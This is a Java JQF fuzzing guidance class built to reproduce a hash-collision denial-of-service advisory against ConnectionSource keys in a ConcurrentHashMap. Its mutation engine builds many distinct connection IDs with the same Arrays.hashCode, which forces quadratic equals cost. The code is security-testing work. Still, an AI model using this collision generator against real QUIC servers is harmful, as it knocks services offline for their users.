package tech.kwik.fuzz.guidance;

import dosguide.validate.SignalSource;
import edu.berkeley.cs.jqf.fuzz.guidance.Guidance;
import edu.berkeley.cs.jqf.fuzz.guidance.GuidanceException;
import edu.berkeley.cs.jqf.fuzz.guidance.Result;
import edu.berkeley.cs.jqf.instrument.tracing.events.TraceEvent;
import tech.kwik.fuzz.agent.V1Counters;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;
import java.util.function.Consumer;

/**
 * Coverage-guided fuzzing (CGF) + vulnerability-driven feedback (VDF) for
 * GHSA-9f57-9rhg-4hvm: Hash-Collision DoS on {@code ConcurrentHashMap} via
 * {@code ConnectionSource.hashCode / equals}.
 * <p>
 * Primary signal: {@code equalsCount} — the number of {@code ConnectionSource.equals}
 * invocations measured by the V1 agent during one fuzz execution.
 * <p>
 * Mutation strategy — two phases:
 * <ol>
 *   <li><b>Growth phase</b> (input &lt; target size): aggressive doubling and
 *       record repetition to rapidly grow the input toward {@code input_bytes}.</li>
 *   <li><b>Optimization phase</b> (input ≥ target size): primarily the
 *       <em>diversify-all-records</em> mutation, which applies independent
 *       hash-preserving byte-pair changes {@code (+δ, −31·δ)} to every
 *       2-byte atom in every record simultaneously.  This converts an input
 *       of duplicate records into one where each record has a distinct
 *       connection ID that shares the same {@code Arrays.hashCode} bucket,
 *       producing quadratic {@code equals} cost.</li>
 * </ol>
 * <p>
 * Retention: retain inputs whose equalsCount exceeds 90% of the global best;
 * always retain new global bests. Secondary: retain inputs that are longer
 * than any previously retained input (to grow toward {@code input_bytes}).
 */
public class V1Guidance implements Guidance, SignalSource {

    /* ---- configuration ---- */
    private final int maxInputSize;
    private final long maxDurationMs;
    private final File corpusDir;
    private final PrintStream log;

    /* ---- corpus ---- */
    private final List<byte[]> corpus = new ArrayList<>();
    private final List<Long> corpusScores = new ArrayList<>();
    private long bestEqualsCount = 0;
    private int longestRetainedSize = 0;

    /* ---- per-execution state ---- */
    private byte[] currentInput;
    private long currentEqualsCount = 0;

    /* ---- timing / stats ---- */
    private final long startTimeMs;
    private long lastLogTimeMs;
    private long totalExecutions = 0;
    private long savedCount = 0;

    public V1Guidance(File outputDir, long maxDurationMs, PrintStream log) {
        this.maxInputSize = Integer.getInteger("jqf.ei.MAX_INPUT_SIZE", 1_048_576);
        this.maxDurationMs = maxDurationMs;
        this.corpusDir = new File(outputDir, "corpus");
        this.corpusDir.mkdirs();
        this.log = log;
        this.startTimeMs = System.currentTimeMillis();
        this.lastLogTimeMs = startTimeMs;

        // Seed: a single 10-byte connection ID (all zeros).
        // After doubling, all records are identical.  The diversify mutation
        // converts each record to a distinct ID preserving the hash (C=0 per atom).
        byte[] seed = new byte[11];
        seed[0] = 0x09; // length byte → (9 % 20) + 1 = 10-byte ID
        corpus.add(seed);
        corpusScores.add(0L);
    }

    /* ============================================================
     *  Guidance interface
     * ============================================================ */

    @Override
    public InputStream getInput() throws IllegalStateException, GuidanceException {
        // Reset the agent counter before each execution
        V1Counters.reset();

        // Select a parent from the corpus and mutate
        byte[] parent = selectParent();
        currentInput = mutate(parent);

        // Enforce max input size
        if (currentInput.length > maxInputSize) {
            currentInput = Arrays.copyOf(currentInput, maxInputSize);
        }
        // Enforce minimum (at least one valid record)
        if (currentInput.length < 2) {
            currentInput = new byte[]{ 0x09, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        }

        return new ByteArrayInputStream(currentInput);
    }

    @Override
    public boolean hasInput() {
        if (maxDurationMs > 0) {
            return (System.currentTimeMillis() - startTimeMs) < maxDurationMs;
        }
        return true;
    }

    @Override
    public void handleResult(Result result, Throwable error) throws GuidanceException {
        totalExecutions++;
        currentEqualsCount = V1Counters.getEqualsCount();

        // ---- Retention decision ----
        boolean retain = false;

        if (currentEqualsCount > bestEqualsCount) {
            bestEqualsCount = currentEqualsCount;
            retain = true;
        } else if (bestEqualsCount > 0 && currentEqualsCount >= (long)(bestEqualsCount * 0.9)) {
            retain = true;
        }

        // Secondary: grow toward input_bytes
        if (currentInput.length > longestRetainedSize) {
            longestRetainedSize = currentInput.length;
            retain = true;
        }

        if (retain) {
            corpus.add(currentInput.clone());
            corpusScores.add(currentEqualsCount);
            saveInput(currentInput, currentEqualsCount);

            if (corpus.size() > 200) {
                pruneCorpus();
            }
        }

        // ---- Periodic logging ----
        long now = System.currentTimeMillis();
        if (now - lastLogTimeMs >= 1000) {
            long elapsed = (now - startTimeMs) / 1000;
            log.printf("[V1] %ds | execs=%d best_eq=%d last_eq=%d corpus=%d max_len=%d%n",
                    elapsed, totalExecutions, bestEqualsCount,
                    currentEqualsCount, corpus.size(), longestRetainedSize);
            lastLogTimeMs = now;
        }
    }

    @Override
    public Consumer<TraceEvent> generateCallBack(Thread thread) {
        return event -> { };
    }

    /* ============================================================
     *  SignalSource interface
     * ============================================================ */

    @Override
    public Map<String, Double> lastSignals() {
        return Map.of("equalsCount", (double) currentEqualsCount);
    }

    /* ============================================================
     *  Corpus selection
     * ============================================================ */

    private byte[] selectParent() {
        if (corpus.size() == 1) return corpus.get(0);

        ThreadLocalRandom rng = ThreadLocalRandom.current();
        // Weight by equalsCount (primary signal) + length bonus
        double totalWeight = 0;
        for (int i = 0; i < corpus.size(); i++) {
            totalWeight += corpusScores.get(i) + corpus.get(i).length + 1.0;
        }
        double r = rng.nextDouble() * totalWeight;
        double cum = 0;
        for (int i = 0; i < corpus.size(); i++) {
            cum += corpusScores.get(i) + corpus.get(i).length + 1.0;
            if (r <= cum) return corpus.get(i);
        }
        return corpus.get(corpus.size() - 1);
    }

    /* ============================================================
     *  Mutation engine — single mutation per execution
     * ============================================================ */

    private byte[] mutate(byte[] parent) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();

        // Phase 1: grow input to near max size
        if (parent.length < maxInputSize / 2) {
            int choice = rng.nextInt(100);
            if (choice < 55) {
                return mutateDoubleInput(parent);
            } else if (choice < 80) {
                return mutateRepeatRecord(parent, rng);
            } else {
                return mutateDiversifyAllRecords(parent, rng);
            }
        }

        // Phase 2: optimize collision density
        int choice = rng.nextInt(100);
        if (choice < 60) {
            return mutateDiversifyAllRecords(parent, rng);
        } else if (choice < 80) {
            return mutateHashPreservingPair(parent, rng);
        } else if (choice < 92) {
            return mutateRepeatRecord(parent, rng);
        } else {
            return mutateDoubleInput(parent);
        }
    }

    /* ============================================================
     *  Mutation: diversify all records (primary optimization)
     * ============================================================
     *
     * For EVERY record in the input, independently randomize each
     * non-overlapping 2-byte atom by applying a random delta that
     * preserves the atom's contribution to the base-31 polynomial
     * of Arrays.hashCode(byte[]).  This converts an input full of
     * identical (duplicated) records into one where almost every
     * record has a unique connection ID sharing the same hash bucket.
     *
     * For 10-byte IDs (5 atoms, each with 9 valid byte-pair values):
     * 9^5 = 59,049 distinct collision IDs exist.  For inputs up to
     * ~47,000 records, random selection yields ~32,000 unique IDs
     * (birthday paradox), sufficient for the 50% progress threshold.
     */
    private byte[] mutateDiversifyAllRecords(byte[] input, ThreadLocalRandom rng) {
        List<int[]> records = parseRecords(input);
        if (records.isEmpty()) return input;

        byte[] result = input.clone();

        for (int[] rec : records) {
            int idStart = rec[0] + 1; // skip length byte
            int idLen = rec[1];

            // Process non-overlapping byte pairs (atoms)
            for (int k = 0; k + 1 < idLen; k += 2) {
                int pos = idStart + k;
                if (pos + 1 >= result.length) break;

                int curB0 = result[pos];     // signed byte, -128..127
                int curB1 = result[pos + 1]; // signed byte

                // Contribution C = 31 * curB0 + curB1 (preserved by the transformation)
                // Valid delta range: both newB0 = curB0+delta and newB1 = curB1-31*delta
                //                    must stay in [-128, 127].
                int minD = Math.max(-128 - curB0, ceilDiv31(curB1 - 127));
                int maxD = Math.min(127 - curB0, floorDiv31(curB1 + 128));

                if (minD > maxD) continue; // shouldn't happen for reasonable C

                int delta = minD + rng.nextInt(maxD - minD + 1);
                result[pos]     = (byte)(curB0 + delta);
                result[pos + 1] = (byte)(curB1 - 31 * delta);
            }
        }

        return result;
    }

    /**
     * Hash-preserving byte-pair mutation on a SINGLE random record.
     * Changes one 2-byte atom by (+δ, −31·δ), preserving the hash.
     */
    private byte[] mutateHashPreservingPair(byte[] input, ThreadLocalRandom rng) {
        if (input.length < 3) return input;
        List<int[]> records = parseRecords(input);
        if (records.isEmpty()) return input;

        int[] rec = records.get(rng.nextInt(records.size()));
        int idStart = rec[0] + 1;
        int idLen = rec[1];
        if (idLen < 2) return input;

        int k = rng.nextInt(idLen / 2) * 2; // pick an even-aligned pair
        int pos = idStart + k;
        if (pos + 1 >= input.length) return input;

        byte[] result = input.clone();
        int curB0 = result[pos];
        int curB1 = result[pos + 1];

        int minD = Math.max(-128 - curB0, ceilDiv31(curB1 - 127));
        int maxD = Math.min(127 - curB0, floorDiv31(curB1 + 128));
        if (minD > maxD) return result;

        // Choose a non-zero delta for actual change
        int range = maxD - minD + 1;
        if (range <= 1) return result;
        int delta;
        do {
            delta = minD + rng.nextInt(range);
        } while (delta == 0 && range > 1);

        result[pos]     = (byte)(curB0 + delta);
        result[pos + 1] = (byte)(curB1 - 31 * delta);
        return result;
    }

    /** Concatenates the input with itself for rapid size growth. */
    private byte[] mutateDoubleInput(byte[] input) {
        if (input.length == 0) return input;
        int newLen = Math.min((long) input.length * 2 > maxInputSize ? maxInputSize : input.length * 2,
                              maxInputSize);
        if (newLen <= input.length) return input;
        byte[] result = new byte[newLen];
        System.arraycopy(input, 0, result, 0, input.length);
        int remaining = newLen - input.length;
        System.arraycopy(input, 0, result, input.length, Math.min(input.length, remaining));
        return result;
    }

    /** Picks a random record and repeats it K times after its position. */
    private byte[] mutateRepeatRecord(byte[] input, ThreadLocalRandom rng) {
        List<int[]> records = parseRecords(input);
        if (records.isEmpty()) return input;

        int[] rec = records.get(rng.nextInt(records.size()));
        int recStart = rec[0];
        int recTotalLen = 1 + rec[1];

        if (recStart + recTotalLen > input.length) return input;

        int k = rng.nextInt(4, 65); // repeat 4–64 times
        int insertLen = recTotalLen * k;
        int newLen = Math.min(input.length + insertLen, maxInputSize);
        if (newLen <= input.length) return input;

        byte[] result = new byte[newLen];
        int insertPos = recStart + recTotalLen;
        System.arraycopy(input, 0, result, 0, Math.min(insertPos, newLen));
        int written = Math.min(insertPos, newLen);

        byte[] record = Arrays.copyOfRange(input, recStart, recStart + recTotalLen);
        while (written + recTotalLen <= newLen) {
            System.arraycopy(record, 0, result, written, recTotalLen);
            written += recTotalLen;
        }

        if (insertPos < input.length && written < newLen) {
            int copyLen = Math.min(input.length - insertPos, newLen - written);
            System.arraycopy(input, insertPos, result, written, copyLen);
        }

        return result;
    }

    /* ============================================================
     *  Arithmetic helpers
     * ============================================================ */

    /** ceil(a / 31) — a may be negative. */
    private static int ceilDiv31(int a) {
        if (a >= 0) return (a + 30) / 31;
        return a / 31; // Java truncation toward zero = ceiling for neg/pos
    }

    /** floor(a / 31) — a may be negative. */
    private static int floorDiv31(int a) {
        return Math.floorDiv(a, 31);
    }

    /* ============================================================
     *  Input-format helpers
     * ============================================================ */

    /**
     * Parses the input into length-prefixed records.
     * @return list of {@code int[]{startPos, idLength}} for each complete record.
     */
    private static List<int[]> parseRecords(byte[] input) {
        List<int[]> records = new ArrayList<>();
        int pos = 0;
        while (pos < input.length) {
            int idLen = ((input[pos] & 0xff) % 20) + 1;
            if (pos + 1 + idLen > input.length) break;
            records.add(new int[]{ pos, idLen });
            pos += 1 + idLen;
        }
        return records;
    }

    /* ============================================================
     *  Persistence
     * ============================================================ */

    private void saveInput(byte[] input, long equalsCount) {
        try {
            savedCount++;
            String name = String.format("id_%06d_eq_%d.bin", savedCount, equalsCount);
            Files.write(corpusDir.toPath().resolve(name), input);
        } catch (IOException e) {
            // best-effort
        }
    }

    private void pruneCorpus() {
        int target = 100;
        if (corpus.size() <= target) return;

        Integer[] indices = new Integer[corpus.size()];
        for (int i = 0; i < indices.length; i++) indices[i] = i;
        Arrays.sort(indices, (a, b) -> Long.compare(corpusScores.get(b), corpusScores.get(a)));

        boolean[] keep = new boolean[corpus.size()];
        int kept = 0;
        // Keep top entries by equalsCount
        for (int i = 0; i < indices.length && kept < target - 8; i++) {
            keep[indices[i]] = true;
            kept++;
        }
        // Keep 8 longest (for size diversity)
        Integer[] byLength = indices.clone();
        Arrays.sort(byLength, (a, b) -> Integer.compare(corpus.get(b).length, corpus.get(a).length));
        for (int i = 0; i < Math.min(8, byLength.length) && kept < target; i++) {
            if (!keep[byLength[i]]) {
                keep[byLength[i]] = true;
                kept++;
            }
        }

        List<byte[]> newCorpus = new ArrayList<>();
        List<Long> newScores = new ArrayList<>();
        for (int i = 0; i < corpus.size(); i++) {
            if (keep[i]) {
                newCorpus.add(corpus.get(i));
                newScores.add(corpusScores.get(i));
            }
        }
        corpus.clear();
        corpus.addAll(newCorpus);
        corpusScores.clear();
        corpusScores.addAll(newScores);
    }
}
